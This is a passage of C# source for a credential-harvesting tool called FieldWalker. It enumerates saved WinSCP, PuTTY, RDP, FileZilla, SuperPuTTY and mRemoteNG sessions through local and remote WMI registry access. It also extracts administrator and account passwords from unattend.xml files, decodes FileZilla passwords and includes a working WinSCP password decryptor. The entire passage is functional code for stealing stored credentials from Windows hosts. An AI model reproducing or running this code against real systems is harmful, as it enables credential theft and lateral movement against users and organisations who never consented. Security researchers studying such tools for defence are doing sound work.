                    methodParams["sValueName"] = "PublicKeyFile";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        pvtKeyFile = (string)exitCode["sValue"];
                    }
                    methodParams = registryManipulator.GetMethodParameters("GetDWORDValue");
                    methodParams["hDefKey"] = 2147483651;
                    methodParams["sValueName"] = "PortNumber";
                    methodParams["sSubKeyName"] = user + winSCPPathEnding + @"\" +
                       winScpRegistrySession;
                    exitCode = registryManipulator.InvokeMethod("GetDWORDValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        UInt32 portInt = (UInt32)exitCode["uValue"];
                        port = portInt.ToString();
                    }
                    /* //debug
                    Console.WriteLine("\n>>> Got session <<<");
                    Console.WriteLine("Host: " + hostname);
                    Console.WriteLine("Port: " + port);
                    Console.WriteLine("Username: " + username);
                    Console.WriteLine("Password: " + password);
                    Console.WriteLine("KeyFile: " + pvtKeyFile); 
                    */

                    winScpSessions.Add(new session(hostname, port, username, password, pvtKeyFile, "WinSCP"));
                }//end foreach (string winScpRegistrySession in winScpRegistrySessions)

            }//end  if ((string)exitCode["returnValue"] != "0")

            return winScpSessions;
        }// end static List<session> processRemoteWinSCPSessions(...

        static List<session> processRemotePuttySessions(ManagementClass registryManipulator,
           ManagementBaseObject methodParams, string user)
        {
            List<session> puttySessions = new List<session>();
            const string puttyPathEnding = @"\SOFTWARE\SimonTatham\PuTTY\Sessions";
            methodParams["sSubKeyName"] = user + puttyPathEnding;

            ManagementBaseObject exitCode = registryManipulator.InvokeMethod("EnumKey", methodParams, null);
            if (exitCode["returnValue"].ToString() == "0")
            {
                string[] puttyRegistrySessions = (string[])exitCode["sNames"];
                methodParams = registryManipulator.GetMethodParameters("GetStringValue");
                methodParams["hDefKey"] = 2147483651;
                string hostname = "";
                string port = "";
                string username = "";
                string pvtKeyFile = "";

                Console.WriteLine($"-> Found {puttyRegistrySessions.Length.ToString()} PuTTY sessions");

                foreach (string puttyRegistrySession in puttyRegistrySessions)
                {
                    hostname = "";
                    port = "";
                    username = "";
                    pvtKeyFile = "";
                    if (puttyRegistrySession == "Default%20Settings")
                    {
                        continue;
                    }
                    methodParams["sSubKeyName"] = user + puttyPathEnding + @"\" +
                        puttyRegistrySession;

                    methodParams["sValueName"] = "HostName";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        hostname = (string)exitCode["sValue"];
                    }
                    methodParams["sValueName"] = "UserName";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        username = (string)exitCode["sValue"];
                    }
                    //No idea why PuTTY saves private keys as "PublicKeyFile" in the registry
                    methodParams["sValueName"] = "PublicKeyFile";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        pvtKeyFile = (string)exitCode["sValue"];
                    }
                    methodParams = registryManipulator.GetMethodParameters("GetDWORDValue");
                    methodParams["hDefKey"] = 2147483651;
                    methodParams["sValueName"] = "PortNumber";
                    methodParams["sSubKeyName"] = user + puttyPathEnding + @"\" +
                       puttyRegistrySession;
                    exitCode = registryManipulator.InvokeMethod("GetDWORDValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        UInt32 portInt = (UInt32)exitCode["uValue"];
                        port = portInt.ToString();
                    }
                    /* //debug
                    Console.WriteLine("\n>>> Got session <<<");
                    Console.WriteLine("Host: " + hostname);
                    Console.WriteLine("Port: " + port);
                    Console.WriteLine("Username: " + username);
                    Console.WriteLine("Password: " + password);
                    Console.WriteLine("KeyFile: " + pvtKeyFile); 
                    */

                    puttySessions.Add(new session(hostname, port, username, "", pvtKeyFile, "PuTTY"));
                }//end foreach (string winScpRegistrySession in winScpRegistrySessions)

            }// end if (exitCode["returnValue"].ToString() == "0")

            return puttySessions;

        }// end static List<session> processRemotePuttySessions(...

        static List<session> processRemoteRdpSessions(ManagementClass registryManipulator,
           ManagementBaseObject methodParams, string user)
        {
            List<session> rdpSessions = new List<session>();
            const string rdpPathEnding = @"\SOFTWARE\Microsoft\Terminal Server Client\Servers";
            methodParams["sSubKeyName"] = user + rdpPathEnding;

            ManagementBaseObject exitCode = registryManipulator.InvokeMethod("EnumKey", methodParams, null);
            if (exitCode["returnValue"].ToString() == "0")
            {
                string[] rdpRegistrySessions = (string[])exitCode["sNames"];
                methodParams = registryManipulator.GetMethodParameters("GetStringValue");
                methodParams["hDefKey"] = 2147483651;
                string hostname = "";
                string username = "";

                Console.WriteLine($"-> Found {rdpRegistrySessions.Length.ToString()} RDP sessions");

                foreach (string rdpRegistrySession in rdpRegistrySessions)
                {
                    hostname = "";
                    username = "";

                    methodParams["sSubKeyName"] = user + rdpPathEnding + @"\" +
                        rdpRegistrySession;

                    hostname = rdpRegistrySession;

                    methodParams["sValueName"] = "UsernameHint";
                    exitCode = registryManipulator.InvokeMethod("GetStringValue", methodParams, null);
                    if (exitCode["returnValue"].ToString() == "0")
                    {
                        username = (string)exitCode["sValue"];
                    }

                    rdpSessions.Add(new session(hostname, "", username, "", "", "RDP"));
                }//end foreach (string rdpRegistrySession in rdpRegistrySessions)

            }// end if (exitCode["returnValue"].ToString() == "0")
            return rdpSessions;

        }// end static List<session> processRemoteRdpSessions(..

        static List<session> processLocalUnattendFiles(XElement UnattendXml, string target, string fileName, Boolean debug)
        {
            List<session> unattendXmlSessions = new List<session>();

            Console.WriteLine($"-> Found {fileName}");

            XNamespace unattendNS = "urn:schemas-microsoft-com:unattend";

            IEnumerable<XElement> accounts = from el in UnattendXml.Descendants(unattendNS + "UserAccounts") select el;
            if (debug)
                Console.WriteLine("===> # of UserAccounts in " + fileName + ": " + accounts.Count().ToString());
                                          
            //first we look for localadmin passowrds
            accounts = from el in UnattendXml.Descendants(unattendNS + "AdministratorPassword") select el;
            if (debug)
                Console.WriteLine("===> # of AdminPasswords in " + fileName + ": " + accounts.Count().ToString());

            foreach (XElement account in accounts)
            {
                string username = "Local Administrator";
                string hostname = target;
                string port = "0";
                string password = (string)account.Element(unattendNS + "Value");
                unattendXmlSessions.Add(new session(hostname, port, username, password, "", fileName));
            }

            //Now we look for other accounts/passwords
            accounts = from el in UnattendXml.Descendants(unattendNS + "LocalAccount") select el;
            if (debug)
                Console.WriteLine("===> # of LocalAccounts in " + fileName + ": " + accounts.Count().ToString());

            foreach (XElement account in accounts)
            {
                string username = (string)account.Element(unattendNS + "Name");
                string hostname = target;
                string port = "0";
                IEnumerable<XElement> pass = from el in account.Descendants(unattendNS + "Password") select el;
                string password = "";
                foreach (XElement passElement in pass)
                {
                    password = (string)passElement.Element(unattendNS + "Value");
                }
                unattendXmlSessions.Add(new session(hostname, port, username, password, "", fileName));
            }
            return unattendXmlSessions;
        }// end static List<session> processLocalUnattendFiles(XElement UnattendXml)
        static List<session> processLocalFileZillaSessions(XElement fileZillaSettings)
        {
            List<session> fileZillaSessions = new List<session>();

            IEnumerable<XElement> servers = from el in fileZillaSettings.Descendants("Server") select el;

            Console.WriteLine($"-> Found {servers.Count().ToString()} FileZilla sessions");

            foreach (XElement server in servers)
            {
                string hostname = (string)server.Element("Host");
                string port = (string)server.Element("Port");
                string username = (string)server.Element("User");
                var passwordB64Bytes = System.Convert.FromBase64String((string)server.Element("Pass"));
                string password = Encoding.UTF8.GetString(passwordB64Bytes);
                fileZillaSessions.Add(new session(hostname, port, username, password, "", "FileZilla"));
            }

            return fileZillaSessions;
        }

        static List<session> processLocalSuperPuTTYSessions(XElement SuperPuTTYServers)
        {
            List<session> superPuTTYSessions = new List<session>();
            IEnumerable<XElement> servers = from el in SuperPuTTYServers.Descendants("SessionData") select el;

            Console.WriteLine($"-> Found {servers.Count().ToString()} FileZilla sessions");

            foreach (XElement server in servers)
            {
                Console.WriteLine("Foo");
                string hostname = (string)server.Attribute("Host");
                string port = (string)server.Attribute("Port");
                string username = (string)server.Attribute("Username");
                superPuTTYSessions.Add(new session(hostname, port, username, "", "", "SuperPuTTY"));
            }

            return superPuTTYSessions;

        }

        static List<session> processLocalMRemoteNGSessions(XElement mRemoteNGServers)
        {
            List<session> mRemoteNGSessions = new List<session>();
            IEnumerable<XElement> servers = from el in mRemoteNGServers.Descendants("Node") select el;

            Console.WriteLine($"-> Found {servers.Count().ToString()} mRemoteNG sessions");

            foreach (XElement server in servers)
            {
                
                string hostname = (string)server.Attribute("Hostname");
                string port = (string)server.Attribute("Port");
                string username = (string)server.Attribute("Username");
                string password = (string)server.Attribute("Password");
                //ToDo - write up autodecryptor. See https://github.com/gquere/mRemoteNG_password_decrypt
                mRemoteNGSessions.Add(new session(hostname, port, username, password, "", "mRemoteNG"));
            }

            return mRemoteNGSessions;

        }
        static List<session> processLocalPuttySessions(RegistryKey puttyKey)
        {
            List<session> puttySessions = new List<session>();

            string[] sessions = puttyKey.GetSubKeyNames();
            if (sessions.Length == 0)
            {
                return puttySessions;
            }
            else
            {
                Console.WriteLine($"-> Found {sessions.Length.ToString()} PuTTY sessions");
            }
            foreach (string session in sessions)
            {
                //debug
                //Console.WriteLine("Session: " + session);
                string hostname;
                string port;
                string username;
                string pvtKeyFile;

                using (RegistryKey sessionKey = puttyKey.OpenSubKey(session))
                {

                    hostname = sessionKey.GetValue("HostName", "none").ToString();
                    port = sessionKey.GetValue("PortNumber", "none").ToString();
                    username = sessionKey.GetValue("UserName", "none").ToString();
                    // for reasons I do not understand, PuTTY stores the private key filename under "PublicKeyFile"                
                    pvtKeyFile = sessionKey.GetValue("PublicKeyFile", "none").ToString();
                }
                //debug
                //Console.WriteLine("hostname: " + hostname + " username: " + username + " PKF: " + pvtKeyFile);

                puttySessions.Add(new session(hostname, port, username, "", pvtKeyFile, "PuTTY"));
                //debug
                //session foo = new session(hostname, username, "", pvtKeyFile, "PuTTY");
                //puttySessions.Add(foo);
                //Console.WriteLine(foo.ToString());
                //debug 
                //Console.WriteLine("# PuttySessions: " + puttySessions.Count.ToString());
                //  puttySessions.Append(new session() { remoteHost = hostname, username = username, password = "", pvtKeyFile = pvtKeyFile, source = "PuTTY" });

            }// end foreach(session in sessions)
            //debug 
            Console.WriteLine("# PuttySessions: " + puttySessions.Count.ToString());
            return puttySessions;
        } // end void processPuttySessions(RegistryKey puttyKey)

        static List<session> processLocalWinScpSessions(RegistryKey winSCPKey)
        {
            List<session> winScpSessions = new List<session>();

            string[] sessions = winSCPKey.GetSubKeyNames();
            if (sessions.Length == 0)
            {
                return winScpSessions;
            }
            else 
            {
                Console.WriteLine($"Found {sessions.Length.ToString()} WinSCP Sessions");
            }
            foreach (string session in sessions)
            {
                string hostname;
                string port;
                string username;
                string password;
                string pvtKeyFile;
                using (RegistryKey sessionKey = winSCPKey.OpenSubKey(session))
                {
                    //debug
                    //Console.WriteLine("WinSCP Session: " + session);

                    hostname = sessionKey.GetValue("HostName", "none").ToString();
                    port = sessionKey.GetValue("PortNumber", "none").ToString();
                    username = sessionKey.GetValue("UserName", "none").ToString();
                    password = sessionKey.GetValue("Password", "none").ToString();
                    // for reasons I do not understand, WinSCP stores the private key filename under "PublicKeyFile"                
                    pvtKeyFile = sessionKey.GetValue("PublicKeyFile", "none").ToString();

                    if (password != "none")
                    {
                        password = decryptWinScpPassword(hostname, username, password);
                    }
                }
                winScpSessions.Add(new session(hostname, port, username, password, pvtKeyFile, "WinSCP"));
            }// end foreach (string session in sessions)
            //debug 
            //Console.WriteLine("# WinSCP Sessions: " + winScpSessions.Count.ToString());
            return winScpSessions;
        }// end void processWinScpSessions(RegistryKey winSCPKey)

        static List<session> processLocalRdpSessions(RegistryKey rdpKey)
        {
            List<session> rdpSessions = new List<session>();

            string[] sessions = rdpKey.GetSubKeyNames();
            if (sessions.Length == 0)
            {
                return rdpSessions;
            }
            else
            {
                Console.WriteLine($"-> Found {sessions.Length.ToString()} RDP sessions");
            }
            foreach (string session in sessions)
            {
                string username;
                using (RegistryKey sessionKey = rdpKey.OpenSubKey(session))
                {
                    username = sessionKey.GetValue("UsernameHint", "none").ToString();
                }
                rdpSessions.Add(new session(session, "", username, "", "", "RDP"));
            }// end foreach string(session in sessions)

            return rdpSessions;
        } // end void processLocalRdpSessions

        static winScpDecryption decryptNextCharacterWinSCP(string remainingCipherText)
        {
            int firstVal = "0123456789ABCDEF".IndexOf(remainingCipherText[0]) * 16;
            int secondVal = "0123456789ABCDEF".IndexOf(remainingCipherText[1]);

            uint magic = 163;
            uint added = ((uint)(firstVal + secondVal));

            uint decryptedResult = (((~(added ^ magic)) % 256) + 256) % 256;

            return new winScpDecryption(remainingCipherText.Substring(2), decryptedResult);

        }// end static winScpDecryption decryptNextCharacterWinSCP(string remainingCipherText)
        static string decryptWinScpPassword(string hostname, string username, string cipherText)
        {
            uint checkFlag = 255;
            winScpDecryption intermediateResults;

            uint len = 0;
            string key = hostname + username;
            intermediateResults = decryptNextCharacterWinSCP(cipherText);
            uint storedFlag = intermediateResults.decryptedResult;


            if (storedFlag == checkFlag)
            {
                intermediateResults.remainingCipherText = intermediateResults.remainingCipherText.Substring(2);
                intermediateResults = decryptNextCharacterWinSCP(intermediateResults.remainingCipherText);
            }

            len = intermediateResults.decryptedResult;

            intermediateResults = decryptNextCharacterWinSCP(intermediateResults.remainingCipherText);
            intermediateResults.remainingCipherText = intermediateResults.remainingCipherText.Substring(((int)intermediateResults.decryptedResult * 2));

            string finalOutput = "";
            for (int i = 0; i < len; i++)
            {
                intermediateResults = decryptNextCharacterWinSCP(intermediateResults.remainingCipherText);
                finalOutput += (char)intermediateResults.decryptedResult;
            }//end for (int i = 0; i < len; i++)

            if (storedFlag == checkFlag)
            {
                return finalOutput.Substring(key.Length);
            }

            return finalOutput;
        }// end  static string decryptWinScpPassword(string hash)

     

    }//internal class Program

}//end namespace FieldWalker

